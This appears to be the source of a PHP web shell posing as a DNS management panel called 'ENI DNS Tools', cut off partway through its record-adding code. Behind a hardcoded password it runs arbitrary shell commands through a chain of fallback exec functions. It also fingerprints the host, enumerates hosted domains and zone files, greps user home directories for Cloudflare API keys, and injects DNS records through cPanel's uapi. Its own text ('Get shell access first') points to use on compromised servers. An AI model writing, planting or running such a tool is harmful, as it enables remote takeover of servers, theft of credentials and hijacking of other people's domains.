<?php
error_reporting(0);
set_time_limit(120);
@session_start();

$PW = 'eniL0v3';
if (isset($_POST['p']) && $_POST['p'] === $PW) $_SESSION['dns_ok'] = 1;
if (empty($_SESSION['dns_ok'])) {
    echo '<html><body style="background:#0a0a0a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace"><form method=POST style="background:#111;padding:40px;border-radius:8px;text-align:center;border:1px solid #333"><h2 style="color:#00bcd4">🌐 ENI DNS Tools</h2><input name=p type=password placeholder=Password style="background:#000;color:#0ff;border:1px solid #333;padding:10px;width:220px;border-radius:4px"><br><button style="background:#00bcd4;color:#000;border:none;padding:10px 30px;margin-top:12px;cursor:pointer;font-weight:bold;border-radius:4px">Go</button></form></body></html>';
    exit;
}

/* ─── exec engine with FULL fallback chain ─── */
function x($cmd) {
    // Try every possible exec function
    if (function_exists('shell_exec') && !in_array('shell_exec', disabled_funcs())) {
        $r = @shell_exec("$cmd 2>&1");
        if ($r !== null && $r !== false) return $r;
    }
    if (function_exists('exec') && !in_array('exec', disabled_funcs())) {
        $o = [];
        @exec("$cmd 2>&1", $o);
        return implode("\n", (array)$o);
    }
    if (function_exists('system') && !in_array('system', disabled_funcs())) {
        ob_start();
        @system("$cmd 2>&1");
        return ob_get_clean();
    }
    if (function_exists('passthru') && !in_array('passthru', disabled_funcs())) {
        ob_start();
        @passthru("$cmd 2>&1");
        return ob_get_clean();
    }
    if (function_exists('proc_open') && !in_array('proc_open', disabled_funcs())) {
        $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $p = @proc_open($cmd, $d, $pipes);
        if (is_resource($p)) {
            fclose($pipes[0]);
            $out = stream_get_contents($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
            return ($out || $err) ? ($out . $err) : false;
        }
    }
    if (function_exists('popen') && !in_array('popen', disabled_funcs())) {
        $p = @popen("$cmd 2>&1",'r');
        if ($p) {
            $o = '';
            while(!feof($p)) $o .= fread($p, 8192);
            pclose($p);
            return strlen($o) > 0 ? $o : false;
        }
    }
    return false;
}

function disabled_funcs() {
    static $list = null;
    if ($list === null) {
        $raw = @ini_get('disable_functions');
        $list = $raw ? array_map('trim', explode(',', strtolower($raw))) : [];
    }
    return $list;
}

function has_exec() {
    $test = x('echo ENI_OK');
    return ($test !== false && strpos($test, 'ENI_OK') !== false);
}

/* ─── PHP-native DNS query (works WITHOUT shell) ─── */
function php_dns_lookup($domain, $type = DNS_ANY) {
    if (!function_exists('dns_get_record')) return false;
    return @dns_get_record($domain, $type);
}

/* ─── DNS-over-HTTPS query via Cloudflare/Google (works even if dig blocked) ─── */
function doh_query($domain, $type = 'A') {
    $urls = [
        "https://cloudflare-dns.com/dns-query?name=" . urlencode($domain) . "&type=" . urlencode($type),
        "https://dns.google/resolve?name=" . urlencode($domain) . "&type=" . urlencode($type),
    ];
    $ctx = @stream_context_create(['http' => [
        'header' => "Accept: application/dns-json\r\n",
        'timeout' => 8,
        'ignore_errors' => true,
    ], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);

    foreach ($urls as $url) {
        $raw = @file_get_contents($url, false, $ctx);
        if ($raw) {
            $data = @json_decode($raw, true);
            if ($data && isset($data['Answer'])) return $data;
            if ($data) return $data; // even if no Answer, return status
        }
        // Try curl extension if file_get_contents fails
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 8,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_HTTPHEADER => ['Accept: application/dns-json'],
            ]);
            $raw = curl_exec($ch);
            curl_close($ch);
            if ($raw) {
                $data = @json_decode($raw, true);
                if ($data) return $data;
            }
        }
    }
    return false;
}

/* ─── HTTP helper (curl or fgc) ─── */
function http_req($url, $method = 'GET', $headers = [], $body = null) {
    // Prefer curl
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_CUSTOMREQUEST => $method,
        ]);
        if ($body) curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err = curl_error($ch);
        curl_close($ch);
        return ['code' => $code, 'body' => $resp, 'error' => $err];
    }
    // Fallback: file_get_contents
    $h_str = implode("\r\n", $headers) . "\r\n";
    $opts = ['http' => [
        'method' => $method,
        'header' => $h_str,
        'timeout' => 15,
        'ignore_errors' => true,
    ], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]];
    if ($body) $opts['http']['content'] = $body;
    $ctx = @stream_context_create($opts);
    $resp = @file_get_contents($url, false, $ctx);
    return ['code' => 0, 'body' => $resp ?: '', 'error' => $resp === false ? 'fgc failed' : ''];
}

/* ─── styling ─── */
echo '<html><head><title>ENI DNS Tools</title><meta charset="UTF-8"><style>';
echo 'body{background:#0a0a0a;color:#eee;font-family:"Cascadia Code","Fira Code",monospace;padding:20px;font-size:13px;max-width:1100px;margin:0 auto}';
echo 'h1{color:#00bcd4;margin-bottom:5px} h2{color:#00bcd4;border-bottom:1px solid #333;padding-bottom:8px;margin-top:25px}';
echo '.box{background:#111;border:1px solid #222;padding:15px;margin:10px 0;border-radius:6px}';
echo '.ok{color:#4caf50;font-weight:bold} .no{color:#f44;font-weight:bold} .warn{color:#ff9800}';
echo 'pre{white-space:pre-wrap;word-wrap:break-word;color:#aaa;font-size:12px;max-height:300px;overflow:auto}';
echo 'input,select,textarea{background:#0a0a0a;color:#0ff;border:1px solid #333;padding:8px 12px;font-family:monospace;border-radius:4px;font-size:13px}';
echo 'button,.btn{background:#00bcd4;color:#000;border:none;padding:8px 18px;cursor:pointer;font-weight:bold;border-radius:4px;font-family:monospace;font-size:13px;margin:3px}';
echo 'button:hover{background:#26c6da} .btn-red{background:#f44} .btn-green{background:#4caf50}';
echo 'table{width:100%;border-collapse:collapse} th{text-align:left;padding:8px;color:#00bcd4;border-bottom:1px solid #333} td{padding:6px 8px;border-bottom:1px solid #1a1a1a}';
echo '.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:bold;margin:2px}';
echo '.tag-green{background:#1b5e20;color:#4caf50} .tag-red{background:#4a0000;color:#f44} .tag-yellow{background:#4a3800;color:#ff9800} .tag-blue{background:#0d47a1;color:#42a5f5}';
echo '</style></head><body>';
echo '<h1>🌐 ENI DNS Tools v2</h1>';
echo '<small style="color:#666">Auto-Recon + DNS Manager | PHP-native + Shell + DoH fallbacks</small>';

/* ─── Quick Tools (FIRST, always visible) ─── */
echo '<h2>🔧 Quick Tools</h2>';

// DNS Lookup (PHP-native, no shell needed)
echo '<div class="box"><b>🔎 Quick DNS Lookup (PHP native — no shell needed)</b><br><br>';
echo '<form method="POST" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">';
echo '<input name="qlookup_domain" style="flex:1;min-width:200px" placeholder="domain (e.g. loomia.fr)">';
echo '<select name="qlookup_type"><option>NS</option><option>TXT</option><option>MX</option><option>A</option><option>AAAA</option><option>CNAME</option><option>SOA</option><option>ANY</option></select>';
echo '<button type="submit" name="do_qlookup" value="1">🔍 Lookup</button></form>';
if (isset($_POST['do_qlookup']) && trim($_POST['qlookup_domain'])) {
    $qd = trim($_POST['qlookup_domain']);
    $qt = strtoupper(trim($_POST['qlookup_type']));
    $tmap = ['ANY'=>DNS_ANY,'A'=>DNS_A,'AAAA'=>DNS_AAAA,'MX'=>DNS_MX,'TXT'=>DNS_TXT,'CNAME'=>DNS_CNAME,'NS'=>DNS_NS,'SOA'=>DNS_SOA];
    $dtype = isset($tmap[$qt]) ? $tmap[$qt] : DNS_ANY;
    $recs = @dns_get_record($qd, $dtype);
    if ($recs) {
        echo "<br><table><tr><th>Name</th><th>Type</th><th>TTL</th><th>Value</th></tr>";
        foreach ($recs as $r) {
            $v = '';
            if (isset($r['txt']))    $v = $r['txt'];
            if (isset($r['ip']))     $v = $r['ip'];
            if (isset($r['ipv6']))   $v = $r['ipv6'];
            if (isset($r['target'])) $v = (isset($r['pri']) ? "[{$r['pri']}] " : '') . $r['target'];
            if (isset($r['mname']))  $v = "ns={$r['mname']} email={$r['rname']} serial={$r['serial']}";
            echo "<tr><td>{$r['host']}</td><td><span class='tag tag-blue'>{$r['type']}</span></td><td>{$r['ttl']}</td><td style='color:#aaa'>" . htmlspecialchars($v) . "</td></tr>";
        }
        echo '</table>';
    } else {
        echo "<br><span class='warn'>No $qt records found for $qd</span>";
    }
}
echo '</div>';

// Manual Shell Command
echo '<div class="box"><b>💻 Shell Command</b><br><br>';
echo '<form method="POST" style="display:flex;gap:8px">';
echo '<input name="dns_cmd" style="flex:1" placeholder="any shell command...">';
echo '<button type="submit">Run</button></form>';
if (isset($_POST['dns_cmd']) && $_POST['dns_cmd']) {
    $cmd_out = x($_POST['dns_cmd']);
    if ($cmd_out === false || trim($cmd_out) === '') {
        $diag = [];
        $diag[] = "proc_open: " . (function_exists('proc_open') ? (in_array('proc_open', disabled_funcs()) ? 'disabled' : 'enabled') : 'not_exists');
        $diag[] = "popen: " . (function_exists('popen') ? (in_array('popen', disabled_funcs()) ? 'disabled' : 'enabled') : 'not_exists');
        $cmd_out = "[BLOCKED / NO OUTPUT] Could not execute command.\nDiagnostics: " . implode(" | ", $diag);
    }
    echo '<br><pre>' . htmlspecialchars($cmd_out) . '</pre>';
}
echo '</div>';



/* ═══════════════════════════════════════════════════
   SECTION 0: PHP CAPABILITIES (most important)
   ═══════════════════════════════════════════════════ */
echo '<h2>⚙️ PHP Capabilities</h2>';
echo '<div class="box">';

// Disabled functions
$disabled = disabled_funcs();
$exec_funcs = ['shell_exec','exec','system','passthru','proc_open','popen','pcntl_exec','pcntl_fork'];
$net_funcs = ['curl_init','file_get_contents','fsockopen','stream_socket_client','fopen'];
$dns_funcs = ['dns_get_record','checkdnsrr','gethostbyname','gethostbyaddr','getmxrr'];
$file_funcs = ['file_put_contents','file_get_contents','fwrite','fopen','scandir','glob','is_writable'];

echo '<b>🔴 Exec Functions:</b><br>';
$has_any_exec = false;
foreach ($exec_funcs as $fn) {
    $exists = function_exists($fn);
    $blocked = in_array(strtolower($fn), $disabled);
    if ($exists && !$blocked) {
        echo "<span class='tag tag-green'>✓ $fn</span> ";
        $has_any_exec = true;
    } elseif ($blocked) {
        echo "<span class='tag tag-red'>✗ $fn (disabled)</span> ";
    } else {
        echo "<span class='tag tag-red'>✗ $fn</span> ";
    }
}
$shell_works = has_exec();
echo '<br><b>Shell execution: </b>';
echo $shell_works ? "<span class='ok'>WORKING ✓</span>" : "<span class='no'>BLOCKED ✗ (using PHP-native fallbacks)</span>";

echo '<br><br><b>🌐 Network Functions:</b><br>';
foreach ($net_funcs as $fn) {
    $exists = function_exists($fn) || ($fn === 'file_get_contents' || $fn === 'fopen'); // these always exist
    $blocked = in_array(strtolower($fn), $disabled);
    $works = $exists && !$blocked;
    // Special check for allow_url_fopen
    if (($fn === 'file_get_contents' || $fn === 'fopen') && !ini_get('allow_url_fopen')) {
        $works = false;
        echo "<span class='tag tag-yellow'>⚠ $fn (allow_url_fopen=Off)</span> ";
    } elseif ($works) {
        echo "<span class='tag tag-green'>✓ $fn</span> ";
    } else {
        echo "<span class='tag tag-red'>✗ $fn</span> ";
    }
}

echo '<br><br><b>🔎 DNS Functions (PHP built-in):</b><br>';
$has_dns_func = false;
foreach ($dns_funcs as $fn) {
    $exists = function_exists($fn);
    $blocked = in_array(strtolower($fn), $disabled);
    if ($exists && !$blocked) {
        echo "<span class='tag tag-green'>✓ $fn</span> ";
        $has_dns_func = true;
    } else {
        echo "<span class='tag tag-red'>✗ $fn</span> ";
    }
}

echo '<br><br><b>📂 File Functions:</b><br>';
foreach ($file_funcs as $fn) {
    $exists = function_exists($fn);
    $blocked = in_array(strtolower($fn), $disabled);
    if ($exists && !$blocked) {
        echo "<span class='tag tag-green'>✓ $fn</span> ";
    } else {
        echo "<span class='tag tag-red'>✗ $fn</span> ";
    }
}

// DoH test
echo '<br><br><b>🌍 DNS-over-HTTPS (DoH):</b> ';
$doh_test = doh_query('google.com', 'A');
if ($doh_test && isset($doh_test['Status']) && $doh_test['Status'] === 0) {
    echo "<span class='ok'>WORKING ✓</span> (bypass all server DNS restrictions!)";
} else {
    echo "<span class='warn'>Not reachable (outbound HTTPS might be blocked)</span>";
}

if ($disabled) {
    echo '<br><br><b style="color:#f44">Disabled functions list:</b><br>';
    echo '<pre style="color:#f44;font-size:11px">' . htmlspecialchars(implode(', ', $disabled)) . '</pre>';
}
echo '</div>';

/* ═══════════════════════════════════════════════════
   SECTION 1: SERVER RECON (PHP-native + shell)
   ═══════════════════════════════════════════════════ */
echo '<h2>🔍 Server Auto-Recon</h2>';
echo '<div class="box">';

// PHP-native info (ALWAYS works)
$hostname = php_uname('n');
$os_full  = php_uname();
$whoami   = get_current_user();
$php_user = ''; // try posix
if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $pw = posix_getpwuid(posix_geteuid());
    if ($pw) $php_user = $pw['name'];
}
if (!$php_user && $shell_works) $php_user = trim(x('whoami'));
if (!$php_user) $php_user = $whoami;
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : '');
$doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
$server_sw = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '';

// External IP via PHP
$ext_ip = '';
if (function_exists('curl_init') || ini_get('allow_url_fopen')) {
    $ip_services = ['https://ifconfig.me/ip', 'https://icanhazip.com', 'https://api.ipify.org'];
    foreach ($ip_services as $svc) {
        $r = http_req($svc);
        if ($r['body'] && preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/', trim($r['body']))) {
            $ext_ip = trim($r['body']);
            break;
        }
    }
}
if (!$ext_ip && $shell_works) $ext_ip = trim(x('curl -s ifconfig.me 2>/dev/null'));

echo "<b>Hostname:</b> <span class='ok'>" . htmlspecialchars($hostname) . "</span><br>";
echo "<b>PHP Process User:</b> <span class='" . ($php_user === 'root' ? 'ok' : 'warn') . "'>" . htmlspecialchars($php_user) . "</span>";
if ($php_user === 'root') echo ' <span class="tag tag-green">ROOT</span>';
echo "<br><b>Server IP:</b> " . htmlspecialchars($server_ip);
if ($ext_ip) echo " | <b>External:</b> $ext_ip";
echo "<br><b>Server Software:</b> " . htmlspecialchars($server_sw);
echo "<br><b>Document Root:</b> <span style='color:#888'>" . htmlspecialchars($doc_root) . "</span>";
echo "<br><b>PHP Version:</b> " . PHP_VERSION;
echo "<br><b>OS:</b> <span style='color:#888;font-size:12px'>" . htmlspecialchars($os_full) . "</span>";
echo '</div>';

// Panel Detection (PHP-native file checks + shell fallback)
echo '<div class="box"><b>🖥️ Panel Detection</b><br><br>';
$panels = [
    'cPanel/WHM'   => ['/usr/local/cpanel/cpanel', '/usr/local/cpanel/version'],
    'DirectAdmin'  => ['/usr/local/directadmin/directadmin', '/usr/local/directadmin/conf/directadmin.conf'],
    'Plesk'        => ['/usr/local/psa/version', '/opt/psa/version'],
    'CyberPanel'   => ['/usr/local/CyberCP/manage.py', '/usr/local/CyberCP/plogical/'],
    'HestiaCP'     => ['/usr/local/hestia/bin/v-list-sys-info', '/usr/local/hestia/conf/'],
    'VestaCP'      => ['/usr/local/vesta/bin/v-list-sys-info', '/usr/local/vesta/conf/'],
    'Webmin'       => ['/etc/webmin/version', '/etc/webmin/miniserv.conf'],
    'ISPConfig'    => ['/usr/local/ispconfig/interface/lib/config.inc.php', '/usr/local/ispconfig/server/'],
    'CWP'          => ['/usr/local/cwpsrv/bin/cwpsrv', '/usr/local/cwp/'],
    'AAPanel'      => ['/www/server/panel/BT-Panel', '/www/server/panel/class/'],
];
$detected_panel = 'None';
foreach ($panels as $name => $paths) {
    $found = false;
    foreach ($paths as $p) {
        if (@file_exists($p) || @is_dir($p)) { $found = true; break; }
    }
    $cls = $found ? 'tag tag-green' : 'tag tag-red';
    echo "<span class='$cls'>$name</span> ";
    if ($found && $detected_panel === 'None') $detected_panel = $name;
}
echo "<br><br><b>Detected:</b> <span class='ok'>$detected_panel</span>";
echo '</div>';

// DNS Daemon Detection
echo '<div class="box"><b>🌐 DNS Daemon</b><br><br>';
$detected_dns = 'Unknown';
if ($shell_works) {
    $dns_procs = trim(x("ps aux | grep -E 'named|bind|pdns|nsd|unbound|dnsmasq' | grep -v grep"));
    $daemons = ['BIND/named'=>'named','PowerDNS'=>'pdns_server','NSD'=>'nsd','Unbound'=>'unbound','dnsmasq'=>'dnsmasq'];
    foreach ($daemons as $name => $proc) {
        $running = (strpos($dns_procs, $proc) !== false);
        echo "<span class='tag " . ($running ? 'tag-green' : 'tag-red') . "'>$name</span> ";
        if ($running) $detected_dns = $name;
    }
    if (trim($dns_procs)) echo "<br><pre>" . htmlspecialchars($dns_procs) . "</pre>";
} else {
    // PHP-native: check config files
    $dns_checks = [
        'BIND/named' => ['/etc/named.conf', '/etc/bind/named.conf'],
        'PowerDNS'   => ['/etc/powerdns/pdns.conf', '/etc/pdns/pdns.conf'],
        'NSD'        => ['/etc/nsd/nsd.conf'],
        'dnsmasq'    => ['/etc/dnsmasq.conf'],
    ];
    foreach ($dns_checks as $name => $files) {
        $found = false;
        foreach ($files as $f) { if (@file_exists($f)) { $found = true; break; } }
        echo "<span class='tag " . ($found ? 'tag-yellow' : 'tag-red') . "'>$name" . ($found ? ' (config found)' : '') . "</span> ";
        if ($found && $detected_dns === 'Unknown') $detected_dns = "$name (config exists)";
    }
    echo '<br><span class="warn">⚠ Shell blocked — detected by config file presence only</span>';
}
echo "<br><b>Active:</b> <span class='ok'>$detected_dns</span>";
echo '</div>';

// DNS Tools
if ($shell_works) {
    echo '<div class="box"><b>🔧 Shell DNS Tools</b><br><br>';
    $tools = ['dig','nslookup','host','rndc','pdnsutil','nsupdate','named-checkzone','named-checkconf',
              'whmapi1','plesk','v-add-dns-record','da','curl','wget'];
    foreach ($tools as $tool) {
        $path = trim(x("which $tool 2>/dev/null"));
        $avail = !empty($path) && !preg_match('/not found/i', $path);
        echo "<span class='tag " . ($avail ? 'tag-green' : 'tag-red') . "'>$tool</span> ";
    }
    echo '</div>';
}

// Zone Files (PHP-native scandir)
echo '<div class="box"><b>📂 Zone Files</b><br><br>';
$zone_paths = ['/var/named/','/etc/bind/zones/','/etc/bind/','/var/lib/bind/','/var/named/chroot/var/named/','/etc/nsd/zones/'];
$found_zones = [];
foreach ($zone_paths as $zp) {
    $files = @scandir($zp);
    if ($files) {
        foreach ($files as $zf) {
            if ($zf === '.' || $zf === '..') continue;
            $full = $zp . $zf;
            if (@is_file($full) && preg_match('/\.(db|zone)$/i', $zf)) {
                $writable = @is_writable($full);
                $readable = @is_readable($full);
                $found_zones[] = ['path'=>$full, 'name'=>$zf, 'writable'=>$writable, 'readable'=>$readable, 'size'=>@filesize($full)];
            }
        }
    }
}
// Parse named.conf for zone→file mappings
$conf_zones = [];
$named_confs = ['/etc/named.conf','/etc/bind/named.conf','/etc/bind/named.conf.local','/etc/bind/named.conf.default-zones'];
foreach ($named_confs as $nc) {
    $content = @file_get_contents($nc);
    if ($content && preg_match_all('/zone\s+"([^"]+)".*?file\s+"([^"]+)"/s', $content, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $m) $conf_zones[] = ['domain'=>$m[1], 'file'=>$m[2]];
    }
}

if (!empty($found_zones)) {
    echo '<table><tr><th>Zone File</th><th>Size</th><th>Read</th><th>Write</th></tr>';
    foreach (array_slice($found_zones, 0, 50) as $z) {
        $r = $z['readable'] ? "<span class='ok'>✓</span>" : "<span class='no'>✗</span>";
        $w = $z['writable'] ? "<span class='ok'>✓</span>" : "<span class='no'>✗</span>";
        echo "<tr><td style='color:#aaa;font-size:12px'>{$z['path']}</td><td>" . number_format($z['size']) . "B</td><td>$r</td><td>$w</td></tr>";
    }
    echo '</table>';
} elseif (!empty($conf_zones)) {
    echo '<table><tr><th>Domain</th><th>Zone File</th><th>Read</th><th>Write</th></tr>';
    foreach (array_slice($conf_zones, 0, 50) as $cz) {
        $r = @is_readable($cz['file']) ? "<span class='ok'>✓</span>" : "<span class='no'>✗</span>";
        $w = @is_writable($cz['file']) ? "<span class='ok'>✓</span>" : "<span class='no'>✗</span>";
        echo "<tr><td>{$cz['domain']}</td><td style='color:#aaa;font-size:12px'>{$cz['file']}</td><td>$r</td><td>$w</td></tr>";
    }
    echo '</table>';
} else {
    echo '<span class="warn">No zone files found in standard paths.</span>';
    if ($shell_works) {
        $find_z = trim(x('find /var /etc -maxdepth 4 \( -name "*.db" -o -name "*.zone" \) -type f 2>/dev/null | head -20'));
        if ($find_z) echo "<br><pre>" . htmlspecialchars($find_z) . "</pre>";
    }
}
echo '</div>';

// Domains detection
echo '<div class="box"><b>🔎 Domains on This Server</b><br><br>';
$domains_found = [];
// cPanel
if ($detected_panel === 'cPanel/WHM') {
    $td = @file_get_contents('/etc/trueuserdomains');
    if ($td) foreach (explode("\n", $td) as $l) { $l = trim($l); if ($l && strpos($l, ':') !== false) { $parts = explode(':', $l); $domains_found[] = trim($parts[0]); } }
    if (empty($domains_found)) { $ld = @file_get_contents('/etc/localdomains'); if ($ld) $domains_found = array_filter(array_map('trim', explode("\n", $ld))); }
    if (empty($domains_found)) { $ud = @file_get_contents('/etc/userdomains'); if ($ud) foreach (explode("\n", $ud) as $l) { $l = trim($l); if ($l && strpos($l, ':') !== false) { $parts = explode(':', $l); $domains_found[] = trim($parts[0]); } } }
    if (empty($domains_found)) {
        // Read cPanel user config / nvdata / cache
        $u = get_current_user();
        $cp_paths = ["/var/cpanel/userdata/$u", "/home/$u/.cpanel/datastore/", "/etc/vfilters/"];
        foreach ($cp_paths as $cpp) {
            $f_list = @scandir($cpp);
            if ($f_list) foreach ($f_list as $ff) {
                if ($ff !== '.' && $ff !== '..' && strpos($ff, '.') !== false) $domains_found[] = $ff;
            }
        }
    }
}
// DirectAdmin
if ($detected_panel === 'DirectAdmin') {
    $vdoms = @scandir('/etc/virtual/');
    if ($vdoms) foreach ($vdoms as $vd) { if ($vd !== '.' && $vd !== '..' && @is_dir("/etc/virtual/$vd") && strpos($vd, '.') !== false) $domains_found[] = $vd; }
}
// HestiaCP/VestaCP
foreach (['/usr/local/hestia/data/users/', '/usr/local/vesta/data/users/'] as $upath) {
    $users = @scandir($upath);
    if ($users) foreach ($users as $u) {
        if ($u === '.' || $u === '..') continue;
        $wpath = "$upath$u/web.conf";
        $wc = @file_get_contents($wpath);
        if ($wc && preg_match_all("/DOMAIN='([^']+)'/", $wc, $wm)) $domains_found = array_merge($domains_found, $wm[1]);
    }
}
// httpd/nginx vhosts (PHP-native file read)
foreach (['/etc/httpd/conf.d/', '/etc/apache2/sites-enabled/', '/etc/nginx/conf.d/', '/etc/nginx/sites-enabled/'] as $vhdir) {
    $vhfiles = @scandir($vhdir);
    if ($vhfiles) foreach ($vhfiles as $vf) {
        if ($vf === '.' || $vf === '..') continue;
        $vc = @file_get_contents("$vhdir$vf");
        if ($vc) {
            if (preg_match_all('/(?:ServerName|server_name)\s+([^\s;]+)/i', $vc, $vm)) {
                $domains_found = array_merge($domains_found, $vm[1]);
            }
        }
    }
}
// Shell fallback
if (empty($domains_found) && $shell_works) {
    $grep_doms = trim(x("grep -rhoP 'ServerName\s+\K\S+' /etc/httpd/ /etc/apache2/ /etc/nginx/ 2>/dev/null | sort -u | head -30"));
    if ($grep_doms) $domains_found = array_filter(array_map('trim', explode("\n", $grep_doms)));
}

$domains_found = array_unique(array_filter($domains_found, function($d) {
    return preg_match('/^[a-z0-9][a-z0-9\.-]+\.[a-z]{2,}$/i', $d) && !preg_match('/^(Cpanel|_Cpanel|cache|datastore|vfilters)/i', $d);
}));
if (!empty($domains_found)) {
    sort($domains_found);
    echo '<select id="domain_select" style="width:100%;margin-bottom:10px">';
    foreach ($domains_found as $d) echo "<option value='" . htmlspecialchars($d) . "'>" . htmlspecialchars($d) . "</option>";
    echo '</select>';
    echo '<br><small style="color:#666">Found ' . count($domains_found) . ' domain(s)</small>';
} else {
    echo '<span class="warn">No domains auto-detected. Enter manually below.</span>';
}
echo '</div>';

// Cloudflare API hunting (lightweight — shell grep only, no recursive PHP scan)
echo '<div class="box"><b>☁️ Cloudflare / External DNS Config Hunt</b><br><br>';
$cf_found = [];
if ($shell_works) {
    $cf_grep = trim(x("grep -rsl 'cloudflare\|CF_API\|cf_key' /home/ --include='*.env' --include='*.conf' --include='*.ini' --include='*.json' --include='*.cfg' 2>/dev/null | head -10"));
    if ($cf_grep) $cf_found = array_filter(array_map('trim', explode("\n", $cf_grep)));
} else {
    // PHP-native: only check common locations (fast)
    $quick_paths = ['/home/' . get_current_user() . '/.env', '/home/' . get_current_user() . '/www/.env',
                    '/var/www/.env', '/var/www/html/.env'];
    foreach ($quick_paths as $qp) {
        $c = @file_get_contents($qp);
        if ($c && preg_match('/cloudflare|CF_API/i', $c)) $cf_found[] = $qp;
    }
}
if (!empty($cf_found)) {
    echo "<span class='ok'>Potential Cloudflare config files:</span><br>";
    foreach ($cf_found as $cf) echo "<span style='color:#aaa;font-size:12px'>" . htmlspecialchars($cf) . "</span><br>";
} else {
    echo '<span style="color:#666">No Cloudflare configs found.</span>';
}
echo '</div>';

/* ═══════════════════════════════════════════════════
   SECTION 2: DNS RECORD MANAGER
   ═══════════════════════════════════════════════════ */
echo '<h2>📝 Add DNS Record</h2>';
echo '<div class="box" style="border-color:#4a3800;background:#111">';
echo '<b style="color:#ff9800">⚠ Available Methods:</b><br>';
$methods = [];
if ($shell_works) $methods[] = "<span class='tag tag-green'>Shell commands (dig/rndc/whmapi1/etc)</span>";
if ($detected_panel !== 'None') $methods[] = "<span class='tag tag-green'>Panel API ($detected_panel)</span>";
if (!empty($found_zones) || !empty($conf_zones)) {
    $writable_count = 0;
    foreach ($found_zones as $z) if ($z['writable']) $writable_count++;
    $methods[] = "<span class='tag " . ($writable_count > 0 ? 'tag-green' : 'tag-yellow') . "'>Direct zone file edit ($writable_count writable)</span>";
}
if ($has_dns_func) $methods[] = "<span class='tag tag-blue'>PHP dns_get_record() (read-only)</span>";
if ($doh_test) $methods[] = "<span class='tag tag-blue'>DNS-over-HTTPS (read-only)</span>";
if (empty($methods)) {
    echo '<br><span class="no">⚠ No write methods available! Shell is blocked and no writable zone files found.</span><br>';
    echo '<span class="warn">Options: Get shell access first, or use Cloudflare API if DNS is external.</span>';
} else {
    echo '<br>' . implode(' ', $methods);
}
echo '</div>';

// Handle record addition
if (isset($_POST['add_record'])) {
    $domain   = trim($_POST['rec_domain']);
    $rec_type = trim($_POST['rec_type']);
    $rec_name = trim($_POST['rec_name']);
    $rec_value= trim($_POST['rec_value']);
    $rec_prio = isset($_POST['rec_priority']) ? intval($_POST['rec_priority']) : 0;
    $rec_ttl  = isset($_POST['rec_ttl']) ? intval($_POST['rec_ttl']) : 14400;

    if (!$domain || !$rec_type || !$rec_value) {
        echo '<div class="box" style="border-color:#f44"><span class="no">Missing required fields!</span></div>';
    } else {
        $name_part = $rec_name ? "$rec_name.$domain." : "$domain.";
        $result = '';
        $method = '';

        // Method 1: Panel CLI / cPanel UAPI / API2 / mass_edit_zone
        if ($detected_panel === 'cPanel/WHM') {
            $method = 'cPanel UAPI / API2 / WHM API';
            $esc_dom  = escapeshellarg($domain);
            $esc_name = escapeshellarg($name_part);
            $esc_type = escapeshellarg($rec_type);
            $esc_val  = escapeshellarg($rec_value);

            // Find full paths for cPanel binaries
            $uapi_bin = trim(x("which uapi 2>/dev/null")) ?: '/usr/local/cpanel/bin/uapi';
            $cp_bin   = trim(x("which cpanel 2>/dev/null")) ?: '/usr/local/cpanel/bin/cpanel-api2';
            if (!file_exists($cp_bin) && file_exists('/usr/bin/cpanel')) $cp_bin = '/usr/bin/cpanel';

            // Get SOA serial for the domain
            $soa_rec = @dns_get_record($domain, DNS_SOA);
            $serial = (isset($soa_rec[0]['serial']) && $soa_rec[0]['serial']) ? $soa_rec[0]['serial'] : 0;
            if (!$serial) {
                // Try fetching serial via uapi DNS fetch_zone_records or parse_zone
                $pz_out = x("$uapi_bin DNS parse_zone zone=$esc_dom");
                if ($pz_out && preg_match('/"serial":\s*(\d+)/i', $pz_out, $m_ser)) {
                    $serial = $m_ser[1];
                } elseif ($pz_out && preg_match('/serial:\s*(\d+)/i', $pz_out, $m_ser2)) {
                    $serial = $m_ser2[1];
                }
            }

            // 1. Try UAPI DNS::mass_edit_zone (Modern cPanel UAPI DNS module with serial)
            $json_add = json_encode([
                "dname"       => $rec_name ? "$rec_name.$domain." : "$domain.",
                "ttl"         => $rec_ttl,
                "record_type" => $rec_type,
                "data"        => [$rec_type === 'MX' ? "$rec_prio $rec_value" : $rec_value]
            ]);
            
            $serial_arg = $serial ? " serial=$serial" : "";
            $uapi_mass_cmd = "$uapi_bin DNS mass_edit_zone zone=$esc_dom$serial_arg add=" . escapeshellarg($json_add);
            $res_mass = x($uapi_mass_cmd);

            $result = "Serial Detected: " . ($serial ?: "None") . "\n";
            $result .= "Executed Command:\n$uapi_mass_cmd\n\n";
            $result .= "Command Output:\n" . ($res_mass ?: "(no output returned from execution engine)");
        }
        elseif ($shell_works && $detected_panel === 'Plesk') {
            $method = 'Plesk CLI';
